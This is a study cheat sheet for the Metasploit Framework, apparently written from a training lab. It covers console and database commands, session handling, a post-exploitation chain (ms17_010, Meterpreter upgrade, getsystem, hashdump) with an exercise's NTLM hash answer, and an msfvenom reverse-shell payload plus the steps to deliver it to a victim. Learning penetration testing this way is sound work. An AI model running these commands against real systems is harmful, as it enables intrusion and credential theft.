# Metasploit Framework (English Version)

This is a comprehensive summary of the Metasploit Framework, the primary tool used for scanning, exploiting, and performing post-exploitation tasks.

## 1. 🧠 Core Concepts

|**Command**|**Description**|
|---|---|
|**`msfconsole`**|The main command-line interface for Metasploit.|
|**Context**|The operational environment after using a module (e.g., `msf6 exploit(...) >`). Settings apply only to this module.|
|**`search [keyword]`**|Finds modules based on CVE, exploit name, or target platform.|
|**`use [module]`**|Selects a module to use.|
|**`info`**|Shows detailed information about the selected module.|
|**`show options`**|Displays all required and optional parameters for the current module (e.g., RHOSTS, LHOST, RPORT).|
|**`set [VAR] [VAL]`**|Sets a parameter value in the current context (e.g., `set RHOSTS 10.10.x.x`).|
|**`setg [VAR] [VAL]`**|Sets a **Global** parameter value, persisting across all modules until `msfconsole` is exited.|
|**`exploit` / `run`**|Executes the configured module.|
|**`back`**|Exits the current context and returns to the `msf6 >` prompt.|

## 2. 🗃️ Database Management

Metasploit uses a PostgreSQL database to store scan results, manage projects (Workspaces), and automate post-exploitation tasks.

|**Command**|**Function**|
|---|---|
|**`db_status`**|Checks the connection status to the database.|
|**`workspace`**|Lists, switches, or creates project workspaces (e.g., `workspace -a THM_Project`).|
|**`db_nmap [flags] [target]`**|Executes Nmap and automatically imports all results (hosts, ports, services) into the database.|
|**`hosts`**|Lists all discovered target IPs stored in the current workspace.|
|**`services`**|Lists all open ports and services discovered.|
|**`hosts -R`**|(Key Technique) Automatically pulls all stored IP addresses from the database and sets them as the `RHOSTS` parameter.|

## 3. 🛡️ Exploitation & Session Management

After a successful exploit, we gain a "Session" (a connection) to the target.

|**Command**|**Function**|
|---|---|
|**`sessions -l`**|(`-l` = list) Lists all active sessions.|
|**`^Z` (Ctrl+Z)** or **`background`**|"Backgrounds" the current session (e.g., `meterpreter >`) to return to the `msfconsole`.|
|**`sessions -i [ID]`**|(`-i` = interact) "Interacts" with a backgrounded session to bring it to the foreground (e.g., `sessions -i 1`).|
|**`sessions -k [ID]`**|(`-k` = kill) Kills a specific session.|

## 4. 🚀 Post-Exploitation

This details the complex workflow to "upgrade" a basic shell to Meterpreter, escalate privileges, and dump hashes.

|**Step**|**Command**|**Description/Result**|
|---|---|---|
|**1. Initial Exploit**|`exploit` (e.g., `ms17_010`)|We gain **Session 1** (a basic command Shell `C:\>`).|
|**2. Roadblock**|`reg save hklm\sam sam.hiv`|`ERROR: A required privilege is not held.` (Insufficient privileges).|
|**3. Background Shell**|`^Z` (Ctrl+Z) then `y`|Minimize Session 1 to return to the `msfconsole` prompt.|
|**4. Upgrade Shell**|`use post/multi/manage/shell_to_meterpreter`<br><br>  <br><br>`set SESSION 1`<br><br>  <br><br>`set LHOST [Our_IP]`<br><br>  <br><br>`run`|The upgrade module runs, opening **Session 2** (Meterpreter).|
|**5. Enter Meterpreter**|`sessions -i 2`|The prompt changes to `meterpreter >`.|
|**6. Privilege Escalation**|`getsystem`|Elevate privileges to `NT AUTHORITY\SYSTEM` (for Windows).|
|**7. Dump Hashes**|`hashdump` (Windows) or<br><br>  <br><br>`use post/linux/gather/hashdump` (Linux)|Dump all user hashes from the SAM file or /etc/shadow.|

**Answer (from the exercise):** The NTLM hash for `pirate` is `8ce9a3ebd1647fcc5e04025019f4b875`

## 5. 💣 Payload Generation (Msfvenom & Handler)

When not using a direct Exploit Module (e.g., an upload vulnerability), we must generate a payload with **Msfvenom** and configure the **Handler** manually.

|**Tool**|**Example Command**|**Function**|
|---|---|---|
|**Msfvenom**|`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=... -f elf -o shell.elf`|Creates the standalone payload file (ELF, EXE, PHP, ASP, etc.).|
|**Handler**|`use exploit/multi/handler`|The module used to act as the "Listener" to catch the incoming connection.|

**Msfvenom Workflow:**

1. **Generate Payload (Terminal 1):**
    
    Bash
    
    ```
    # Create an .elf file to connect back to our LHOST on LPORT 4444
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.4.10.128 LPORT=4444 -f elf -o shell.elf
    ```
    
2. **Set up Listener (Terminal 2 - msfconsole):**
    
    Bash
    
    ```
    msf6 > use exploit/multi/handler
    # (CRITICAL!) Set PAYLOAD, LHOST, LPORT to match the Msfvenom command
    msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LHOST 10.4.10.128
    msf6 exploit(multi/handler) > set LPORT 4444
    msf6 exploit(multi/handler) > run
    [*] Started reverse TCP handler...
    ```
    
3. **Transfer & Run (Terminal 3 & 4):**
    
    - Use a Python Web Server (`python3 -m http.server 9000`) to host the file.
        
    - On the victim, use `wget` to download `shell.elf`.
        
    - Run `chmod +x shell.elf` and `./shell.elf`.
        
4. **Catch Session (Back in Terminal 2):**
    
    - `[*] Meterpreter session 1 opened...`
